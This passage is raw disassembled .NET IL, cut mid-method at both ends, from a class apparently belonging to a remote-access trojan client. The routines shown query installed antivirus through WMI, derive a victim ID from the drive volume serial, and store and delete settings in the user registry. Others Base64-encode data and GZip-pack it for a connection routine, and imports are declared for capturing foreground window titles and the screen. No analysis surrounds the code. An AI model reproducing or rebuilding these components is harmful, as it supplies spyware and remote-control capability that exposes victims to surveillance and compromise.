        IL_0434:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0439:  stloc.s    V_15
        IL_043b:  ldloc.s    V_15
        IL_043d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0442:  ldc.i4.0
        IL_0443:  stsfld     bool j.OK::Cn
        IL_0448:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_044d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0452:  leave.s    IL_045c

      }  // end handler
    }  // end .try
    finally
    {
      IL_0454:  ldloc.s    V_8
      IL_0456:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
      IL_045b:  endfinally
    }  // end handler
    IL_045c:  ldsfld     bool j.OK::Cn
    IL_0461:  ret
  } // end of method OK::connect

  .method public static string  DEB(string& s) cil managed
  {
    // Code size       16 (0x10)
    .maxstack  1
    .locals init (uint8[] V_0)
    IL_0000:  ldarg.0
    IL_0001:  ldind.ref
    IL_0002:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
    IL_0007:  stloc.0
    IL_0008:  ldloca.s   V_0
    IL_000a:  call       string j.OK::BS(uint8[]&)
    IL_000f:  ret
  } // end of method OK::DEB

  .method public static void  DLV(string n) cil managed
  {
    // Code size       70 (0x46)
    .maxstack  3
    .locals init (class [mscorlib]System.Exception V_0)
    .try
    {
      IL_0000:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_000f:  ldstr      "Software\\"
      IL_0014:  ldsfld     string j.OK::RG
      IL_0019:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_001e:  ldc.i4.1
      IL_001f:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0024:  ldarg.0
      IL_0025:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string)
      IL_002a:  leave.s    IL_0045

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_002c:  dup
      IL_002d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0032:  stloc.0
      IL_0033:  ldloc.0
      IL_0034:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0039:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_003e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0043:  leave.s    IL_0045

    }  // end handler
    IL_0045:  ret
  } // end of method OK::DLV

  .method public static void  ED() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldc.i4.0
    IL_0001:  call       void j.OK::pr(int32)
    IL_0006:  ret
  } // end of method OK::ED

  .method public static string  ENB(string& s) cil managed
  {
    // Code size       12 (0xc)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       uint8[] j.OK::SB(string&)
    IL_0006:  call       string [mscorlib]System.Convert::ToBase64String(uint8[])
    IL_000b:  ret
  } // end of method OK::ENB

  .method public static pinvokeimpl("user32.dll" nomangle ansi lasterr winapi) 
          native int  GetForegroundWindow() cil managed preservesig
  {
  }
  .method private static pinvokeimpl("kernel32" as "GetVolumeInformationA" nomangle ansi lasterr winapi) 
          int32  GetVolumeInformation(string&  marshal( byvalstr) lpRootPathName,
                                      string&  marshal( byvalstr) lpVolumeNameBuffer,
                                      int32 nVolumeNameSize,
                                      int32& lpVolumeSerialNumber,
                                      int32& lpMaximumComponentLength,
                                      int32& lpFileSystemFlags,
                                      string&  marshal( byvalstr) lpFileSystemNameBuffer,
                                      int32 nFileSystemNameSize) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32.dll" as "GetWindowTextA" nomangle ansi lasterr winapi) 
          int32  GetWindowText(native int hWnd,
                               string&  marshal( byvalstr) WinTitle,
                               int32 MaxLength) cil managed preservesig
  {
  }
  .method public static string  GetAntiVirus() cil managed
  {
    // Code size       326 (0x146)
    .maxstack  7
    .locals init (string V_0,
             int32 V_1,
             int32 V_2,
             int32 V_3,
             object V_4,
             object V_5,
             object[] V_6,
             bool[] V_7,
             object V_8,
             class [mscorlib]System.Collections.IEnumerator V_9,
             object V_10,
             int32 V_11,
             class [mscorlib]System.Exception V_12)
    .try
    {
      IL_0000:  ldc.i4.1
      IL_0001:  stloc.3
      IL_0002:  ldstr      "Select * From AntiVirusProduct"
      IL_0007:  stloc.s    V_4
      IL_0009:  ldc.i4.2
      IL_000a:  stloc.3
      IL_000b:  ldstr      "winmgmts:\\\\.\\root\\SecurityCenter2"
      IL_0010:  ldnull
      IL_0011:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::GetObject(string,
                                                                                                      string)
      IL_0016:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_001b:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0020:  stloc.s    V_5
      IL_0022:  ldc.i4.3
      IL_0023:  stloc.3
      IL_0024:  ldc.i4.1
      IL_0025:  newarr     [mscorlib]System.Object
      IL_002a:  dup
      IL_002b:  ldc.i4.0
      IL_002c:  ldloc.s    V_4
      IL_002e:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0033:  stelem.ref
      IL_0034:  stloc.s    V_6
      IL_0036:  ldc.i4.1
      IL_0037:  newarr     [mscorlib]System.Boolean
      IL_003c:  dup
      IL_003d:  ldc.i4.0
      IL_003e:  ldc.i4.1
      IL_003f:  stelem.i1
      IL_0040:  stloc.s    V_7
      IL_0042:  ldloc.s    V_7
      IL_0044:  ldc.i4.0
      IL_0045:  ldelem.u1
      IL_0046:  brfalse.s  IL_0058

      IL_0048:  ldloc.s    V_6
      IL_004a:  ldc.i4.0
      IL_004b:  ldelem.ref
      IL_004c:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0051:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0056:  stloc.s    V_4
      IL_0058:  ldloc.s    V_5
      IL_005a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_005f:  ldnull
      IL_0060:  ldstr      "ExecQuery"
      IL_0065:  ldloc.s    V_6
      IL_0067:  ldnull
      IL_0068:  ldnull
      IL_0069:  ldloc.s    V_7
      IL_006b:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_0070:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0075:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_007a:  stloc.s    V_8
      IL_007c:  ldc.i4.4
      IL_007d:  stloc.3
      IL_007e:  ldloc.s    V_8
      IL_0080:  castclass  [mscorlib]System.Collections.IEnumerable
      IL_0085:  callvirt   instance class [mscorlib]System.Collections.IEnumerator [mscorlib]System.Collections.IEnumerable::GetEnumerator()
      IL_008a:  stloc.s    V_9
      IL_008c:  br.s       IL_00ca

      IL_008e:  ldloc.s    V_9
      IL_0090:  callvirt   instance object [mscorlib]System.Collections.IEnumerator::get_Current()
      IL_0095:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_009a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_009f:  stloc.s    V_10
      IL_00a1:  ldc.i4.1
      IL_00a2:  stloc.2
      IL_00a3:  ldc.i4.6
      IL_00a4:  stloc.3
      IL_00a5:  ldloc.s    V_10
      IL_00a7:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_00ac:  ldnull
      IL_00ad:  ldstr      "displayName"
      IL_00b2:  ldc.i4.0
      IL_00b3:  newarr     [mscorlib]System.Object
      IL_00b8:  ldnull
      IL_00b9:  ldnull
      IL_00ba:  ldnull
      IL_00bb:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_00c0:  callvirt   instance string [mscorlib]System.Object::ToString()
      IL_00c5:  stloc.0
      IL_00c6:  leave.s    IL_0142

      IL_00c8:  ldc.i4.7
      IL_00c9:  stloc.3
      IL_00ca:  ldloc.s    V_9
      IL_00cc:  callvirt   instance bool [mscorlib]System.Collections.IEnumerator::MoveNext()
      IL_00d1:  brtrue.s   IL_008e

      IL_00d3:  ldloc.s    V_9
      IL_00d5:  isinst     [mscorlib]System.IDisposable
      IL_00da:  brfalse.s  IL_00e8

      IL_00dc:  ldloc.s    V_9
      IL_00de:  isinst     [mscorlib]System.IDisposable
      IL_00e3:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_00e8:  ldc.i4.8
      IL_00e9:  stloc.3
      IL_00ea:  ldstr      "No AV"
      IL_00ef:  stloc.0
      IL_00f0:  leave.s    IL_0142

      IL_00f2:  ldc.i4.0
      IL_00f3:  stloc.1
      IL_00f4:  ldloc.1
      IL_00f5:  ldc.i4.1
      IL_00f6:  add.ovf
      IL_00f7:  stloc.s    V_11
      IL_00f9:  ldloc.s    V_11
      IL_00fb:  ldc.i4.1
      IL_00fc:  sub
      IL_00fd:  switch     ( 
                            IL_0000,
                            IL_0009,
                            IL_0022,
                            IL_007c,
                            IL_00a1,
                            IL_00a3,
                            IL_00c8,
                            IL_00e8,
                            IL_0126)
      IL_0126:  leave.s    IL_0142

      IL_0128:  ldloc.3
      IL_0129:  stloc.1
      IL_012a:  ldloc.2
      IL_012b:  brfalse.s  IL_0131

      IL_012d:  ldloc.2
      IL_012e:  ldc.i4.1
      IL_012f:  beq.s      IL_00f2

      IL_0131:  leave.s    IL_0142

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0133:  dup
      IL_0134:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0139:  stloc.s    V_12
      IL_013b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0140:  leave.s    IL_0128

    }  // end handler
    IL_0142:  ldloc.1
    IL_0143:  pop
    IL_0144:  ldloc.0
    IL_0145:  ret
  } // end of method OK::GetAntiVirus

  .method public static pinvokeimpl("user32.dll" as "GetWindowTextLengthA" nomangle ansi lasterr winapi) 
          int32  GetWindowTextLength(int64 hwnd) cil managed preservesig
  {
  }
  .method public static object  GTV(string n,
                                    object 'ret') cil managed
  {
    // Code size       94 (0x5e)
    .maxstack  3
    .locals init (object V_0,
             class [mscorlib]System.Exception V_1)
    .try
    {
      IL_0000:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_000f:  ldstr      "Software\\"
      IL_0014:  ldsfld     string j.OK::RG
      IL_0019:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_001e:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string)
      IL_0023:  ldarg.0
      IL_0024:  ldarg.1
      IL_0025:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_002a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_002f:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                           object)
      IL_0034:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0039:  stloc.0
      IL_003a:  leave.s    IL_005c

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_003c:  dup
      IL_003d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0042:  stloc.1
      IL_0043:  ldloc.1
      IL_0044:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0049:  ldarg.1
      IL_004a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_004f:  stloc.0
      IL_0050:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0055:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_005a:  leave.s    IL_005c

    }  // end handler
    IL_005c:  ldloc.0
    IL_005d:  ret
  } // end of method OK::GTV

  .method public static string  HWD() cil managed
  {
    // Code size       96 (0x60)
    .maxstack  8
    .locals init (string V_0,
             int32 V_1,
             string V_2,
             int32 V_3,
             int32 V_4,
             string V_5,
             string V_6,
             class [mscorlib]System.Exception V_7)
    .try
    {
      IL_0000:  ldnull
      IL_0001:  stloc.2
      IL_0002:  ldc.i4.0
      IL_0003:  stloc.3
      IL_0004:  ldc.i4.0
      IL_0005:  stloc.s    V_4
      IL_0007:  ldnull
      IL_0008:  stloc.s    V_5
      IL_000a:  ldstr      "SystemDrive"
      IL_000f:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0014:  ldstr      "\\"
      IL_0019:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_001e:  stloc.s    V_6
      IL_0020:  ldloca.s   V_6
      IL_0022:  ldloca.s   V_2
      IL_0024:  ldc.i4.0
      IL_0025:  ldloca.s   V_1
      IL_0027:  ldloca.s   V_3
      IL_0029:  ldloca.s   V_4
      IL_002b:  ldloca.s   V_5
      IL_002d:  ldc.i4.0
      IL_002e:  call       int32 j.OK::GetVolumeInformation(string&,
                                                            string&,
                                                            int32,
                                                            int32&,
                                                            int32&,
                                                            int32&,
                                                            string&,
                                                            int32)
      IL_0033:  pop
      IL_0034:  ldloc.1
      IL_0035:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Conversion::Hex(int32)
      IL_003a:  stloc.0
      IL_003b:  leave.s    IL_005e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_003d:  dup
      IL_003e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0043:  stloc.s    V_7
      IL_0045:  ldloc.s    V_7
      IL_0047:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_004c:  ldstr      "ERR"
      IL_0051:  stloc.0
      IL_0052:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0057:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_005c:  leave.s    IL_005e

    }  // end handler
    IL_005e:  ldloc.0
    IL_005f:  ret
  } // end of method OK::HWD

  .method public static pinvokeimpl("KERNEL32.DLL" winapi) 
          void  Beep(int32 freq,
                     int32 dur) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          native int  FindWindow(string lpClassName,
                                 string lpWindowName) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          bool  ShowWindow(native int hwnd,
                           int32 nCmdShow) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("winmm.dll" winapi) 
          int32  mciSendString(string command,
                               string buffer,
                               int32 bufferSize,
                               native int hwndCallback) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          bool  marshal( bool)  ReleaseDC(native int hWnd,
                                          native int hDC) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("gdi32.dll" winapi) 
          native int  CreateSolidBrush(uint32 crColor) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("gdi32.dll" winapi) 
          bool  PatBlt(native int hdc,
                       int32 nXLeft,
                       int32 nYLeft,
                       int32 nWidth,
                       int32 nHeight,
                       valuetype j.OK/TernaryRasterOperations dwRop) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("gdi32.dll" nomangle unicode lasterr stdcall) 
          object  BitBlt(native int hdcDest,
                         int32 nXDest,
                         int32 nYDest,
                         int32 nWidth,
                         int32 nHeight,
                         native int hdcSrc,
                         int32 nXSrc,
                         int32 nYSrc,
                         int32 dwRop) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("gdi32.dll" winapi) 
          bool  StretchBlt(native int hdcDest,
                           int32 nXOriginDest,
                           int32 nYOriginDest,
                           int32 nWidthDest,
                           int32 nHeightDest,
                           native int hdcSrc,
                           int32 nXOriginSrc,
                           int32 nYOriginSrc,
                           int32 nWidthSrc,
                           int32 nHeightSrc,
                           valuetype j.OK/TernaryRasterOperations dwRop) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          native int  GetDesktopWindow() cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          native int  GetWindowDC(native int hWnd) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("gdi32" winapi) 
          native int  SelectObject(native int hdc,
                                   native int hgdiobj) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("gdi32" winapi) 
          bool  DeleteObject(native int objectHandle) cil managed preservesig
  {
  }
  .method public static uint8[]  ZIP(uint8[] B,
                                     bool& CM) cil managed
  {
    // Code size       774 (0x306)
    .maxstack  13
    .locals init (uint8[] V_0,
             object V_1,
             object V_2,
             uint8[] V_3,
             object[] V_4,
             bool[] V_5,
             object V_6,
             object V_7,
             uint8[] V_8,
             int32 V_9,
             uint8[] V_10)
    IL_0000:  ldarg.1
    IL_0001:  ldind.u1
    IL_0002:  brfalse    IL_0154

    IL_0007:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_000c:  stloc.1
    IL_000d:  ldloc.1
    IL_000e:  castclass  [mscorlib]System.IO.Stream
    IL_0013:  ldc.i4.1
    IL_0014:  ldc.i4.1
    IL_0015:  newobj     instance void [System]System.IO.Compression.GZipStream::.ctor(class [mscorlib]System.IO.Stream,
                                                                                       valuetype [System]System.IO.Compression.CompressionMode,
                                                                                       bool)
    IL_001a:  stloc.2
    IL_001b:  ldloc.2
    IL_001c:  ldnull
    IL_001d:  ldstr      "Write"
    IL_0022:  ldc.i4.3
    IL_0023:  newarr     [mscorlib]System.Object
    IL_0028:  dup
    IL_0029:  ldc.i4.0
    IL_002a:  ldarg.0
    IL_002b:  stelem.ref
    IL_002c:  dup
    IL_002d:  ldc.i4.1
    IL_002e:  ldc.i4.0
    IL_002f:  box        [mscorlib]System.Int32
    IL_0034:  stelem.ref
    IL_0035:  dup
    IL_0036:  ldc.i4.2
    IL_0037:  ldarg.0
    IL_0038:  ldlen
    IL_0039:  conv.i4
    IL_003a:  box        [mscorlib]System.Int32
    IL_003f:  stelem.ref
    IL_0040:  dup
    IL_0041:  stloc.s    V_4
    IL_0043:  ldnull
    IL_0044:  ldnull
    IL_0045:  ldc.i4.3
    IL_0046:  newarr     [mscorlib]System.Boolean
    IL_004b:  dup
    IL_004c:  ldc.i4.0
    IL_004d:  ldc.i4.1
    IL_004e:  stelem.i1
    IL_004f:  dup
    IL_0050:  stloc.s    V_5
    IL_0052:  ldc.i4.1
    IL_0053:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                       class [mscorlib]System.Type,
                                                                                                                       string,
                                                                                                                       object[],
                                                                                                                       string[],
                                                                                                                       class [mscorlib]System.Type[],
                                                                                                                       bool[],
                                                                                                                       bool)
    IL_0058:  pop
    IL_0059:  ldloc.s    V_5
    IL_005b:  ldc.i4.0
    IL_005c:  ldelem.u1
    IL_005d:  brfalse.s  IL_007e

    IL_005f:  ldloc.s    V_4
    IL_0061:  ldc.i4.0
    IL_0062:  ldelem.ref
    IL_0063:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_0068:  ldtoken    uint8[]
    IL_006d:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_0072:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                      class [mscorlib]System.Type)
    IL_0077:  castclass  uint8[]
    IL_007c:  starg.s    B
    IL_007e:  ldloc.2
    IL_007f:  ldnull
    IL_0080:  ldstr      "Dispose"
    IL_0085:  ldc.i4.0
    IL_0086:  newarr     [mscorlib]System.Object
    IL_008b:  ldnull
    IL_008c:  ldnull
    IL_008d:  ldnull
    IL_008e:  ldc.i4.1
    IL_008f:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                       class [mscorlib]System.Type,
                                                                                                                       string,
                                                                                                                       object[],
                                                                                                                       string[],
                                                                                                                       class [mscorlib]System.Type[],
                                                                                                                       bool[],
                                                                                                                       bool)
    IL_0094:  pop
    IL_0095:  ldloc.1
    IL_0096:  ldnull
    IL_0097:  ldstr      "Position"
    IL_009c:  ldc.i4.1
    IL_009d:  newarr     [mscorlib]System.Object
    IL_00a2:  dup
    IL_00a3:  ldc.i4.0
    IL_00a4:  ldc.i4.0
    IL_00a5:  box        [mscorlib]System.Int32
    IL_00aa:  stelem.ref
    IL_00ab:  ldnull
    IL_00ac:  ldnull
    IL_00ad:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                    class [mscorlib]System.Type,
                                                                                                                    string,
                                                                                                                    object[],
                                                                                                                    string[],
                                                                                                                    class [mscorlib]System.Type[])
    IL_00b2:  ldloc.1
    IL_00b3:  ldnull
    IL_00b4:  ldstr      "Length"
    IL_00b9:  ldc.i4.0
    IL_00ba:  newarr     [mscorlib]System.Object
    IL_00bf:  ldnull
    IL_00c0:  ldnull
    IL_00c1:  ldnull
    IL_00c2:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[],
                                                                                                                      bool[])
    IL_00c7:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(object)
    IL_00cc:  ldc.i4.1
    IL_00cd:  add.ovf
    IL_00ce:  newarr     [mscorlib]System.Byte
    IL_00d3:  stloc.3
    IL_00d4:  ldloc.1
    IL_00d5:  ldnull
    IL_00d6:  ldstr      "Read"
    IL_00db:  ldc.i4.3
    IL_00dc:  newarr     [mscorlib]System.Object
    IL_00e1:  dup
    IL_00e2:  ldc.i4.0
    IL_00e3:  ldloc.3
    IL_00e4:  stelem.ref
    IL_00e5:  dup
    IL_00e6:  ldc.i4.1
    IL_00e7:  ldc.i4.0
    IL_00e8:  box        [mscorlib]System.Int32
    IL_00ed:  stelem.ref
    IL_00ee:  dup
    IL_00ef:  ldc.i4.2
    IL_00f0:  ldloc.3
    IL_00f1:  ldlen
    IL_00f2:  conv.i4
    IL_00f3:  box        [mscorlib]System.Int32
    IL_00f8:  stelem.ref
    IL_00f9:  dup
    IL_00fa:  stloc.s    V_4
    IL_00fc:  ldnull
    IL_00fd:  ldnull
    IL_00fe:  ldc.i4.3
    IL_00ff:  newarr     [mscorlib]System.Boolean
    IL_0104:  dup
    IL_0105:  ldc.i4.0
    IL_0106:  ldc.i4.1
    IL_0107:  stelem.i1
    IL_0108:  dup
    IL_0109:  stloc.s    V_5
    IL_010b:  ldc.i4.1
    IL_010c:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                       class [mscorlib]System.Type,
                                                                                                                       string,
                                                                                                                       object[],
                                                                                                                       string[],
                                                                                                                       class [mscorlib]System.Type[],
                                                                                                                       bool[],
                                                                                                                       bool)
    IL_0111:  pop
    IL_0112:  ldloc.s    V_5
    IL_0114:  ldc.i4.0
    IL_0115:  ldelem.u1
    IL_0116:  brfalse.s  IL_0136

    IL_0118:  ldloc.s    V_4
    IL_011a:  ldc.i4.0
    IL_011b:  ldelem.ref
    IL_011c:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_0121:  ldtoken    uint8[]
    IL_0126:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_012b:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                      class [mscorlib]System.Type)
    IL_0130:  castclass  uint8[]
    IL_0135:  stloc.3
    IL_0136:  ldloc.1
    IL_0137:  ldnull
    IL_0138:  ldstr      "Dispose"
    IL_013d:  ldc.i4.0
    IL_013e:  newarr     [mscorlib]System.Object
    IL_0143:  ldnull
    IL_0144:  ldnull
    IL_0145:  ldnull
    IL_0146:  ldc.i4.1
    IL_0147:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                       class [mscorlib]System.Type,
                                                                                                                       string,
                                                                                                                       object[],
                                                                                                                       string[],
                                                                                                                       class [mscorlib]System.Type[],
                                                                                                                       bool[],
                                                                                                                       bool)
    IL_014c:  pop
    IL_014d:  ldloc.3
    IL_014e:  stloc.0
    IL_014f:  br         IL_0304

    IL_0154:  ldarg.0
    IL_0155:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor(uint8[])
    IL_015a:  stloc.s    V_6
    IL_015c:  ldloc.s    V_6
    IL_015e:  castclass  [mscorlib]System.IO.Stream
    IL_0163:  ldc.i4.0
    IL_0164:  newobj     instance void [System]System.IO.Compression.GZipStream::.ctor(class [mscorlib]System.IO.Stream,
                                                                                       valuetype [System]System.IO.Compression.CompressionMode)
    IL_0169:  stloc.s    V_7
    IL_016b:  ldc.i4.4
    IL_016c:  newarr     [mscorlib]System.Byte
    IL_0171:  stloc.s    V_8
    IL_0173:  ldloc.s    V_6
    IL_0175:  ldnull
    IL_0176:  ldstr      "Position"
    IL_017b:  ldc.i4.1
    IL_017c:  newarr     [mscorlib]System.Object
    IL_0181:  dup
    IL_0182:  ldc.i4.0
    IL_0183:  ldloc.s    V_6
    IL_0185:  ldnull
    IL_0186:  ldstr      "Length"
    IL_018b:  ldc.i4.0
    IL_018c:  newarr     [mscorlib]System.Object
    IL_0191:  ldnull
    IL_0192:  ldnull
    IL_0193:  ldnull
    IL_0194:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[],
                                                                                                                      bool[])
    IL_0199:  ldc.i4.5
    IL_019a:  box        [mscorlib]System.Int32
    IL_019f:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::SubtractObject(object,
                                                                                                                        object)
    IL_01a4:  stelem.ref
    IL_01a5:  ldnull
    IL_01a6:  ldnull
    IL_01a7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                    class [mscorlib]System.Type,
                                                                                                                    string,
                                                                                                                    object[],
                                                                                                                    string[],
                                                                                                                    class [mscorlib]System.Type[])
    IL_01ac:  ldloc.s    V_6
    IL_01ae:  ldnull
    IL_01af:  ldstr      "Read"
    IL_01b4:  ldc.i4.3
    IL_01b5:  newarr     [mscorlib]System.Object
    IL_01ba:  dup
    IL_01bb:  ldc.i4.0
    IL_01bc:  ldloc.s    V_8
    IL_01be:  stelem.ref
    IL_01bf:  dup
    IL_01c0:  ldc.i4.1
    IL_01c1:  ldc.i4.0
    IL_01c2:  box        [mscorlib]System.Int32
    IL_01c7:  stelem.ref
    IL_01c8:  dup
